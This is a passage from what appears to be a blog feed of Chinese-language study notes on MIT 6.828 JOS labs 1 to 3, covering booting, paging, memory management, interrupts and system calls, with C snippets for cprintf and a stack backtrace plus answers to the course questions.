class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/07/28/ZUEBvwYOe5tQk6x.png" alt="image-20210728165240665" title="">                </div>                <div class="image-caption">image-20210728165240665</div>            </figure><p>trap则负责检查中断是否来自用户态，从而决定执行完中断处理后如何返回。</p><h6 id="3-系统调用"><a href="#3-系统调用" class="headerlink" title="3. 系统调用"></a>3. 系统调用</h6><p>系统调用也是通过软中断实现的，因此处理方式与第二部分相同，我们实现系统调用只需要在idt中多加一项代表系统调用的门描述符即可，向其中存入系统调用trapEntry的地址。在trap_dispatch中提取用户通过寄存器传递的参数，然后将这些参数传递给真正根据系统调用号来提供不同功能的函数syscall。在执行不同系统调用对应得函数时，需要注意检查用户传递的参数，若为内存则必须进行权限的判断，以防止用户越权读写内存导致不可预料的后果。用户是否具有权限可通过页表中对应索引处存储的物理地址后12位来判断。这个判断还有另一个好处，若用户请求访问的内存是未映射的，那么就肯定不具有权限，从根本上保证了用户态的page fault不会导致内核态中发生page fault，换言之内核态中一旦发生page fault一定是不可修复的，系统应当直接panic。</p><h6 id="4-question-amp-code"><a href="#4-question-amp-code" class="headerlink" title="4. question &amp; code"></a>4. question &amp; code</h6><p>关于这部分的内容欢迎dalao斧正。</p><ul><li><p>What is the purpose of having an individual handler function for each exception/interrupt? (i.e., if all exceptions/interrupts were delivered to the same handler, what feature that exists in the current implementation could not be provided?)</p><p>不同的handler可以传递不同的中断号，若所有中断都由同一个trapEntry进入到内核态则内核中无法确定是哪一种中断。此外由于不同中断是否带有error code的情况也不一样，若是都使用一个trapEntry，传递给内核的Trapframe长度随中断不同也可能会不同。</p></li><li><p>Did you have to do anything to make the <code>user/softint</code> program behave correctly? The grade script expects it to produce a general protection fault (trap 13), but <code>softint</code>‘s code says <code>int $14</code>. <em>Why</em> should this produce interrupt vector 13? What happens if the kernel actually allows <code>softint</code>‘s <code>int $14</code> instruction to invoke the kernel’s page fault handler (which is interrupt vector 14)?</p><p>因为门描述符的权限控制，由用户态进程主动引发的中断权限只有3，而page fault的门描述符权限要求为0，不符合权限就转变成了general protection fault。若内核允许用户态主动引发page fault，那么用户可以间接地控制物理页的分配。</p></li><li><p>The break point test case will either generate a break point exception or a general protection fault depending on how you initialized the break point entry in the IDT (i.e., your call to <code>SETGATE</code> from <code>trap_init</code>). Why? How do you need to set it up in order to get the breakpoint exception to work as specified above and what incorrect setup would cause it to trigger a general protection fault?</p><p>这个问题的原因也是门描述的权限设置不正确导致的，int3是用户态进程主动引发的，权限只有3，若int3的门描述符权限设置为比3小的数就会变成general protection fault。因此将门描述符权限设置为3就能够正常的触发int3中断处理。</p></li><li><p>What do you think is the point of these mechanisms, particularly in light of what the <code>user/softint</code> test program does?</p><p>门描述符的权限设置至关重要，若是权限设置错误轻则无法正常处理中断，重则导致用户越权。</p></li><li><p>编译相关问题</p><p>发现使用gcc-8编译会导致所有测试都过不去，问题出在kern_pgdir初始化上，memset清空kern_pgdir后，发现kern_pgdir变量本身也变为了0。ida看了一下kernel发现end居然在kern_pgdir前，不知道为啥。只能把在end后的变量都赋一个初始值，免得被放到bss段。</p><p><img src="https://i.loli.net/2021/08/09/gTE9PWpdS57qMVz.png" alt="image-20210809113012033"></p></li><li><p><a href="https://github.com/veltavid/mit-6.828-jos-study/tree/lab3" target="_blank" rel="noopener">https://github.com/veltavid/mit-6.828-jos-study/tree/lab3</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h6 id=&quot;1-进程环境建立&quot;&gt;&lt;a href=&quot;#1-进程环境建立&quot; class=&quot;headerlink&quot; title=&quot;1. 进程环境建立&quot;&gt;&lt;/a&gt;1. 进程环境建立&lt;/h6&gt;&lt;p&gt;第一部分的主要工作是将用户态执行的程序装载到内存中。为了与内核态区别开来，我们首先需要一</summary>
      
    
    
    
    
    <category term="操作系统" scheme="https://veltavid.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>MIT-6.828-JOS-lab2实验笔记</title>
    <link href="https://veltavid.github.io/2021/087fe16b97.html"/>
    <id>https://veltavid.github.io/2021/087fe16b97.html</id>
    <published>2021-08-17T01:10:01.000Z</published>
    <updated>2021-08-17T08:25:23.963Z</updated>
    
    <content type="html"><![CDATA[<h6 id="1-Physical-Page-Management"><a href="#1-Physical-Page-Management" class="headerlink" title="1. Physical Page Management"></a>1. Physical Page Management</h6><p>这部分完成的是物理页初始化及其管理的相关函数。</p><ul><li><p>static void * boot_alloc()</p><p>这是在物理页管理数组初始化前用于物理内存分配的函数。实现方式也很朴素，获取装载到内存中的内核最高的未使用的虚拟地址，将其按页对齐后得到起始地址，从这个地址往后以页为单位进行内存分配。</p></li><li><p>void page_init()</p><p>这个函数会初始化boot_alloc分配得到的物理页管理数组。大多数的物理页都应该被描述成空闲状态并且被插入到空闲链表中。一些需要保留的物理页如下所述：</p><ul><li>第一个物理页，这是为了保护BIOS和实模式下的IDT等相关数据。</li><li>从0x0A0000开始到0x100000的物理页，这片384KB大小的空间留给操作系统I/O使用。</li><li>加载内核的物理页。</li><li>内核之后的由boot_alloc分配给页表目录和物理页管理数组的物理页。</li></ul></li><li><p>struct PageInfo * page_alloc(int alloc_flags)</p><p>这个函数是在物理页管理数组初始化完成后真正用来分配物理内存的函数，此时不应再使用boot_alloc()。它会从非空的空闲链表中取下一个物理页分配出去，并根据alloc_flags中alloc_zero的设置与否来决定是否清空该物理页的数据。</p></li><li><p>void page_free(struct PageInfo *pp)</p><p>这个函数先检查被释放的物理页是否引用计数已经为0，若不为0说明还在使用中不能被释放；还需判断link域是否为0，若不为0则说明已经在空闲链表中，其出现double free现象应当报错。通过检测的物理页就被插入到空闲链表中。</p></li></ul><h6 id="2-Virtual-Memory"><a href="#2-Virtual-Memory" class="headerlink" title="2. Virtual Memory"></a>2. Virtual Memory</h6><p>这部分实现的是对二级页表进行操作的函数。</p><ul><li><p>pte_t * pgdir_walk(pde_t *pgdir, const void *va, int create)</p><p>pgdir是页表目录，va是待查找的虚拟地址，create决定当va所在页表未分配时是否分配。该函数就是根据va的高10位找到它所在页表的索引，然后从页表目录中取出来，若不存在且create为真就调用page_alloc将该页表映射到一个物理页。拿到页表后再根据va的中间10位得到其在页表内部的索引，由索引及页表得到指向va映射物理页的指针。</p><p>在本函数中若是分配了新的页表，将其对应的物理地址存到页表目录中，并且需要设置可访问、可写、用户可用的权限标志。</p></li><li><p>struct PageInfo * page_lookup(pde_t *pgdir, void *va, pte_t **pte_store)</p><p>该函数用于寻找va映射的物理页，并将其所在页表中的对应指针存储到pte_store中。后一个操作是为了方便page_remove移除page之后置空，因此其他调用page_lookup的函数不应传递pte_store。</p></li><li><p>void page_remove(pde_t *pgdir, void *va)</p><p>该函数利用page_lookup找到va映射的物理页，将其引用计数减一，当引用计数为0时就使用page_free释放该物理页。随后利用pte_store指针将va对应页表的相应索引处置空。最后需要注意的是每次成功移除一个物理页都要刷新TLB，TLB是一个高速缓存，用于加快内存转换的速度，刷新是为了清除TLB中被remove的物理页对应表项。</p></li><li><p>int page_insert(pde_t *pgdir, struct PageInfo *pp, void *va, int perm)</p><p>该函数要将va映射的物理页改为pp，因此先page_remove掉原先的物理页。注意当原先物理页与pp相同时，这样的操作可能会导致映射的物理页也存在于空闲链表上，因此要在page_remove前就增加pp的引用计数。然后将pgdir_walk找到的指向va映射物理页的指针改为指向pp对应物理地址，同时权限在perm的基础上还要增加可访问的权限。</p></li><li><p>static void boot_map_region(pde_t *pgdir, uintptr_t va, size_t size, physaddr_t pa, int perm)</p><p>该函数的作用是将[va,va+size)映射到[pa,pa+size)，其中va，pa，size都为物理页大小的整数倍。实现方式就是不断地调用pgdir_walk获取指向va映射物理页的指针，将其指向改为pa即可，同时注意权限在perm的基础上还要增加可访问的权限。这个函数主要是为了方便下一部分中内核相关内存区域的映射。</p></li></ul><h6 id="3-Kernel-Address-Space"><a href="#3-Kernel-Address-Space" class="headerlink" title="3. Kernel Address Space"></a>3. Kernel Address Space</h6><p>这部分完成的是内核相关的一些内存区域的映射。</p><ul><li><p>物理页管理相关数据结构的映射</p><p>我们在第一部分中建立的物理页管理数组pages是负责描述各物理页状态的数据结构，既然它也是内存中的数据那么也需要映射到物理地址。由于内核虚拟地址与物理地址的转换就是加减内核基址，我们可以直接用boot_map_region建立这样的映射，通过这个虚拟地址访问的权限设置成仅内核可读可写。为了使用户也能够获取pages中的数据，我们还要将pages拷贝的虚拟地址也映射到内核中这块物理地址上，只是拷贝的虚拟地址访问时只能够读取，无法写入。通过逻辑上使用2块内存空间可以有效地区分内核与用户的权限，但实际上使用的是同一块物理内存，因此也没有浪费内存空间。</p></li><li><p>内核栈的映射</p><p>内核栈的虚拟地址空间有1024个页大小，但实际上只有最高的8个页被映射到了物理页，低的那些作为屏障将内核栈与其他内存空间隔离开，避免栈在降低时写坏了其他内存中有用的数据。</p></li><li><p>内核本身的映射</p><p>将内核加载基址之后的所有虚拟内存都映射到从0开始的物理地址。这是我们所有操作的大前提：内核虚拟地址与其映射的物理地址转换是通过加减内核加载基址实现的。这个前提是通过装载一个静态设置的临时页表实现的。</p></li></ul><h6 id="4-总体流程"><a href="#4-总体流程" class="headerlink" title="4. 总体流程"></a>4. 总体流程</h6><p>内核通过mem_init函数将以上3部分的初始化及检查串联起来。下面是mem_init的大致流程。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/07/22/FYEqg1Vkm5ONAW3.png" alt="mem_init" title="">                </div>                <div class="image-caption">mem_init</div>            </figure><p>其中装载页表目录是通过设置cr3寄存器实现的，启用分页功能则是设置cr0寄存器中对应标志位。</p><h6 id="5-question-amp-code"><a href="#5-question-amp-code" class="headerlink" title="5. question &amp; code"></a>5. question &amp; code</h6><p>关于这部分的内容欢迎dalao斧正。</p><ul><li><p>Assuming that the following JOS kernel code is correct, what type should variable <code>x</code> have, <code>uintptr_t</code> or <code>physaddr_t</code>?</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mystery_t</span> x;</span><br><span class="line"><span class="keyword">char</span>* value = return_a_pointer();</span><br><span class="line">*value = <span class="number">10</span>;</span><br><span class="line">x = (<span class="keyword">mystery_t</span>) value;</span><br></pre></td></tr></table></figure><p>应当为uintptr_t。因为开启了分页功能之后，都是在虚拟内存上读写。</p></li><li><p>What entries (rows) in the page directory have been filled in at this point? What addresses do they map and where do they point? In other words, fill out this table as much as possible:</p><table><thead><tr><th>Entry</th><th>Base Virtual Address</th><th>Points to (logically):</th></tr></thead><tbody><tr><td>1023</td><td>0xFFC00000</td><td>Page table for top 4MB of phys memory</td></tr><tr><td>1022</td><td>0xFF800000</td><td>Page table for top second 4MB of phys memory</td></tr><tr><td>x</td><td>x&lt;&lt;22</td><td>?</td></tr><tr><td>4</td><td>0x01000000</td><td>Page table for bottom fifth 4MB of phys memory</td></tr><tr><td>3</td><td>0x00C00000</td><td>Page table for bottom fourth 4MB of phys memory</td></tr><tr><td>2</td><td>0x00800000</td><td>Page table for bottom third 4MB of phys memory</td></tr><tr><td>1</td><td>0x00400000</td><td>Page table for bottom second 4MB of phys memory</td></tr><tr><td>0</td><td>0x00000000</td><td>[see next question]</td></tr></tbody></table></li><li><p>We have placed the kernel and user environment in the same address space. Why will user programs not be able to read or write the kernel’s memory? What specific mechanisms protect the kernel memory?</p><p>因为页表中不仅存储了虚拟内存地址映射的物理页，还存储了虚拟内存的权限。我们在映射kernel内存到物理页时，设置的权限都是用户不可读不可写。CPU在使用我们提供的页表进行地址转换时还会检查操作是否符合权限要求，这是在CPU硬件支持下才能实现的保护机制。</p></li><li><p>What is the maximum amount of physical memory that this operating system can support? Why?</p><p>4GB。单张页表能够映射4MB物理内存，扩展到二级页表能支持的最大物理内存就是1024*4MB，即4GB。</p></li><li><p>How much space overhead is there for managing memory, if we actually had the maximum amount of physical memory? How is this overhead broken down?</p><p>4+4+4KB*(1024+1)+8*(4GB/4KB)+8</p><p>其实就是下面这些数据结构占用的内存空间。</p><p><img src="https://i.loli.net/2021/08/17/wSQEfPMZRya1L2A.png" alt="image-20210817105728505"></p><p>实际上的开销不会像上述计算出的那么大，”4KB*(1024+1)”这部分一般要更小，因为只有当页表目录中的每项都分配了一张页表的时候才会达到这个开销，而很少有程序会用到这么多内存。</p></li><li><p>Revisit the page table setup in <code>kern/entry.S</code> and <code>kern/entrypgdir.c</code>. Immediately after we turn on paging, EIP is still a low number (a little over 1MB). At what point do we transition to running at an EIP above KERNBASE? What makes it possible for us to continue executing at a low EIP between when we enable paging and when we begin running at an EIP above KERNBASE? Why is this transition necessary?</p><p>当执行完jmp eax后就开始执行KERNBASE之上的内存了。</p><p>因为装载的页表事先写入了映射关系，它将从0x00000000开始的以及0xf0000000开始的4MB虚拟内存都映射到了从0x00000000开始的4MB物理内存。</p><p>这是因为操作系统的惯例就是将kernel放到高地址，我们必须要跳转到高地址继续执行kernel。此外这个页表是临时的，在它的帮助下我们会建立正式的页表，在正式页表中0x00000000开始的4MB虚拟内存不一定会映射到0x00000000开始的4MB物理内存。</p></li><li><p><a href="https://github.com/veltavid/mit-6.828-jos-study/tree/lab2" target="_blank" rel="noopener">https://github.com/veltavid/mit-6.828-jos-study/tree/lab2</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h6 id=&quot;1-Physical-Page-Management&quot;&gt;&lt;a href=&quot;#1-Physical-Page-Management&quot; class=&quot;headerlink&quot; title=&quot;1. Physical Page Management&quot;&gt;&lt;/a&gt;1. Phys</summary>
      
    
    
    
    
    <category term="操作系统" scheme="https://veltavid.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>MIT-6.828-JOS-lab1实验笔记</title>
    <link href="https://veltavid.github.io/2021/08c22b0759.html"/>
    <id>https://veltavid.github.io/2021/08c22b0759.html</id>
    <published>2021-08-17T01:09:38.000Z</published>
    <updated>2021-08-17T08:24:43.303Z</updated>
    
    <content type="html"><![CDATA[<h6 id="1-启动过程"><a href="#1-启动过程" class="headerlink" title="1. 启动过程"></a>1. 启动过程</h6><ul><li><p>BIOS</p><p>BIOS由qemu模拟，它会初始化中断描述符表，查找并启动设备，当BIOS找到可启动的磁盘后，它会将磁盘中位于第一个扇区的bootloader装载到内存中，其装载地址是固定的，随后控制权被移交给bootloader。</p></li><li><p>bootloader</p><p>bootloader源码在boot文件夹下。bootloader在启动时会被BIOS装载到物理地址0x7c00，它所做的事有：</p><ul><li><p>开启A20地址线，防止高位地址被清零。</p></li><li><p>设置好GDTR寄存器，并将模式从实模式切换到保护模式。</p></li><li><p>使用ljmp设置cs为内核代码段选择子，再设置各个段寄存器为内核数据段选择子。</p></li><li><p>使用I/O汇编指令读取磁盘上第二个扇区中存储的内核文件。</p></li><li><p>通过内核文件的header信息来装载内核文件的不同segement。</p></li><li><p>最后跳转到内核的入口点，将控制权移交给内核。</p></li></ul></li><li><p>实模式与保护模式</p><ul><li><p>实模式</p><p>从上述启动过程中我们能够看出CPU在刚启动时是处于实模式的，所谓实模式就是32位CPU的16位运行模式，它的存在意义是为了兼容过去的16位CPU，因此在实模式下CPU会尽量模拟成与过去16位CPU相同的样子。主要的特点有：</p><ul><li><p>寄存器都只使用低16位。</p></li><li><p>程序中使用的地址都是真实的物理地址。</p></li><li><p>寻址空间大小为1MB，如果段基址加偏移的结果超出了这个范围就会回卷。</p></li><li><p>没有内核态与用户态之分。</p></li></ul><p>实模式下A20是关闭的，任何地址高于20位的部分会被清零，因此bootloader将CPU从实模式转换到保护模式前才需要先将A20设置为1。</p></li><li><p>保护模式</p><p>保护模式下CPU中的各个寄存器都能使用32位，段寄存器中程序可控的部分只有低16位，这被称为段选择子，它的结构如下图所示</p><p><img src="https://i.loli.net/2021/08/16/DpRIgk3vwmHhbUT.png" alt="image-20210816163849565"></p><p>使用段选择子中的索引可以在GDT中找到对应段描述符，从段描述符中获取段基址，段属性，段限长字段存入段寄存器的高80位。之后计算地址时使用段基址加上段内偏移计算出线性地址，linux段描述符的段基址都为0，所以计算出的线性地址与偏移地址相同。</p></li></ul></li><li><p>kernel</p><p>从bootmain函数中可以看出内核会被装载到从0x10000开始的物理内存，但为什么说kernel被加载的物理地址是0x100000呢。查看一下kernel的头部结构就能够解答这个疑问了。</p><p><img src="https://i.loli.net/2021/08/16/6tXMAPHv1YBc2rQ.png" alt="kernel_pa"></p><p>从图上可以看出kernel共有3个program header，第一个program header的装载物理地址为0x100000。</p><p>通常为了区分user内存与kernel内存，kernel应该被放到高地址处。在JOS中kernel的基地址为0xf0100000，但物理内存并没有这么多，实际上这块只是虚拟内存，它是由0x100000映射过去的，这种映射CPU已经提供了硬件支持，我们只需要为CPU提供一张页表即可实现，本实验中已经提供给我们了一张静态的页表，因此我们暂时不需要考虑物理页的分配问题——这是下一个实验的工作。</p></li></ul><h6 id="2-code"><a href="#2-code" class="headerlink" title="2. code"></a>2. code</h6><ul><li><p>cprintf补全</p><p>程序缺少%o格式化符的实现，仿照%d补全如下，将base改为8即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'o'</span>:</span><br><span class="line">num = getint(&amp;ap, lflag);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">long</span> <span class="keyword">long</span>) num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">putch(<span class="string">'-'</span>, putdat);</span><br><span class="line">num = -(<span class="keyword">long</span> <span class="keyword">long</span>) num;</span><br><span class="line">&#125;</span><br><span class="line">base = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">goto</span> number;</span><br></pre></td></tr></table></figure></li><li><p>backtrace实现</p><ul><li><p>打印ebp，eip及参数</p><p>随意定义一个变量，根据其地址算出ebp及存储返回地址与参数的栈上地址，按格式循环打印出来，根据entry.S可知当ebp为0时即可停止。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">mon_backtrace(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> ebp,eip,arg1,arg2,arg3,arg4,arg5;</span><br><span class="line">ebp=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x1c</span>;</span><br><span class="line">eip=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x20</span>;</span><br><span class="line">arg1=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x24</span>;</span><br><span class="line">arg2=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x28</span>;</span><br><span class="line">arg3=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x2c</span>;</span><br><span class="line">arg4=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x30</span>;</span><br><span class="line">arg5=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x34</span>;</span><br><span class="line">cprintf(<span class="string">"Stack backtrace:\n"</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">cprintf(<span class="string">"  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n"</span>,ebp,get32(eip),get32(arg1),get32(arg2),get32(arg3),\</span><br><span class="line">get32(arg4),get32(arg5));</span><br><span class="line"><span class="keyword">if</span>(!get32(ebp))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">ebp=(<span class="keyword">uint32_t</span>)get32(ebp);</span><br><span class="line">eip=ebp+<span class="number">4</span>;</span><br><span class="line">arg1=ebp+<span class="number">8</span>;</span><br><span class="line">arg2=ebp+<span class="number">0xc</span>;</span><br><span class="line">arg3=ebp+<span class="number">0x10</span>;</span><br><span class="line">arg4=ebp+<span class="number">0x14</span>;</span><br><span class="line">arg5=ebp+<span class="number">0x18</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>打印debug信息</p><p>通过debuginfo_eip函数可以获得地址所属于哪个函数，以及源文件名。但debuginfo_eip中获取源文件行数需要我们自己实现。查看stabs文档可以知道N_SLINE类型的stab中存储了我们需要的行数，在n_desc域中。</p><p><img src="https://i.loli.net/2021/06/03/afCcvwiOWLnD9Vo.png" alt="image-20210603140127447"></p><p>因此使用stab_binsearch找到类型为N_SLINE的stab，然后将它的n_desc域赋值给info的eip_line域即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stab_binsearch(stabs, &amp;lfun, &amp;rfun, N_SLINE, addr);</span><br><span class="line">info-&gt;eip_line=stabs[lfun].n_desc;</span><br></pre></td></tr></table></figure></li><li><p>最终版backtrace</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">mon_backtrace(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> ebp,eip,arg1,arg2,arg3,arg4,arg5;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Eipdebuginfo</span> <span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">char</span> func_name[<span class="number">64</span>];</span><br><span class="line"><span class="keyword">int</span> func_line;</span><br><span class="line">ebp=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x1c</span>;</span><br><span class="line">eip=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x20</span>;</span><br><span class="line">arg1=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x24</span>;</span><br><span class="line">arg2=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x28</span>;</span><br><span class="line">arg3=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x2c</span>;</span><br><span class="line">arg4=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x30</span>;</span><br><span class="line">arg5=((<span class="keyword">uint32_t</span>)&amp;temp)+<span class="number">0x34</span>;</span><br><span class="line">cprintf(<span class="string">"Stack backtrace:\n"</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">debuginfo_eip((<span class="keyword">uintptr_t</span>)get32(eip), &amp;info);</span><br><span class="line">func_line=(<span class="keyword">uint32_t</span>)get32(eip)-(<span class="keyword">uint32_t</span>)info.eip_fn_addr+<span class="number">1</span>;</span><br><span class="line"><span class="built_in">strncpy</span>(func_name,info.eip_fn_name,info.eip_fn_namelen);</span><br><span class="line">*(func_name+info.eip_fn_namelen)=<span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">cprintf(<span class="string">"  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n"</span>,ebp,get32(eip),get32(arg1),get32(arg2),get32(arg3),\</span><br><span class="line">get32(arg4),get32(arg5));</span><br><span class="line">cprintf(<span class="string">"         %s:%d: %s+%d\n"</span>,info.eip_file,info.eip_line,func_name,func_line);</span><br><span class="line"><span class="keyword">if</span>(!get32(ebp))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">ebp=(<span class="keyword">uint32_t</span>)get32(ebp);</span><br><span class="line">eip=ebp+<span class="number">4</span>;</span><br><span class="line">arg1=ebp+<span class="number">8</span>;</span><br><span class="line">arg2=ebp+<span class="number">0xc</span>;</span><br><span class="line">arg3=ebp+<span class="number">0x10</span>;</span><br><span class="line">arg4=ebp+<span class="number">0x14</span>;</span><br><span class="line">arg5=ebp+<span class="number">0x18</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h6 id="3-question-amp-code"><a href="#3-question-amp-code" class="headerlink" title="3. question &amp; code"></a>3. question &amp; code</h6><p>关于这部分的内容欢迎dalao斧正。</p><ul><li><p>At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode?</p><p>在ljmp后。ljmp会根据段选择子将GDT中对应的段描述符存储到cs段寄存器中，从而改变段基址。由于段描述符中的段基址为0，所以实际上是进入了平坦模式，直接根据偏移量跳转到了32位汇编指令区域。</p></li><li><p>What is the <em>last</em> instruction of the boot loader executed, and what is the <em>first</em> instruction of the kernel it just loaded?</p><p>最后一条指令是call dword ptr ds:10018h，0x10000是装载kernel头部信息的地方，偏移0x18处存储着kernel的入口点。kernel执行的第一条指令是mov large word ptr ds:472h, 1234h。</p></li><li><p><em>Where</em> is the first instruction of the kernel?</p><p>0x10000c。</p></li><li><p>How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information?</p><p>每个segment中包含的sector数目由program header结构体中的p_memsz字段决定，只需要用p_memsz除以单个sector的大小就可以知道要读取多少个sector。</p></li><li><p>Reset the machine (exit QEMU/GDB and start them again). Examine the 8 words of memory at 0x00100000 at the point the BIOS enters the boot loader, and then again at the point the boot loader enters the kernel. Why are they different? What is there at the second breakpoint? (You do not really need to use QEMU to answer this question. Just think.)</p><p>因为BIOS将控制权交给bootloader时内核还未加载，所以在0x100000处的数据应当为0。而bootloader将控制权移交给内核时，已经在0x100000处加载了内核，所以此时该处存有内核数据。</p></li><li><p>Explain the interface between <code>printf.c</code> and <code>console.c</code>. Specifically, what function does <code>console.c</code> export? How is this function used by <code>printf.c</code>?</p><p>printf.c调用console.c提供的cputchar函数实现单个字符的输出。console.c导出的函数为cputchar。printf.c将调用cputchar的putch作为打印单个字符的功能函数传给了printfmt.c中的vprintfmt。</p></li><li><p>Explain the following from console.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>      <span class="keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;</span><br><span class="line"><span class="number">2</span>              <span class="keyword">int</span> i;</span><br><span class="line"><span class="number">3</span>              memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>));</span><br><span class="line"><span class="number">4</span>              <span class="keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)</span><br><span class="line"><span class="number">5</span>                      crt_buf[i] = <span class="number">0x0700</span> | <span class="string">' '</span>;</span><br><span class="line"><span class="number">6</span>              crt_pos -= CRT_COLS;</span><br><span class="line"><span class="number">7</span>      &#125;</span><br></pre></td></tr></table></figure><p>当窗口中显示的字符已经满了但还需要打印新的字符时，会整体向上移一行，空出最下面一行来打印新的字符。</p></li><li><p>For the following questions you might wish to consult the notes for Lecture 2. These notes cover GCC’s calling convention on the x86.</p><p>Trace the execution of the following code step-by-step:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">1</span>, y = <span class="number">3</span>, z = <span class="number">4</span>;</span><br><span class="line">cprintf(<span class="string">"x %d, y %x, z %d\n"</span>, x, y, z);</span><br></pre></td></tr></table></figure><ul><li><p>In the call to <code>cprintf()</code>, to what does <code>fmt</code> point? To what does <code>ap</code> point?</p><p>fmt参数指向”x %d, y %x, z %d\n”字符串。ap指向栈上存储的cprintf第二个参数，即1。</p></li><li><p>List (in order of execution) each call to <code>cons_putc</code>, <code>va_arg</code>, and <code>vcprintf</code>. For 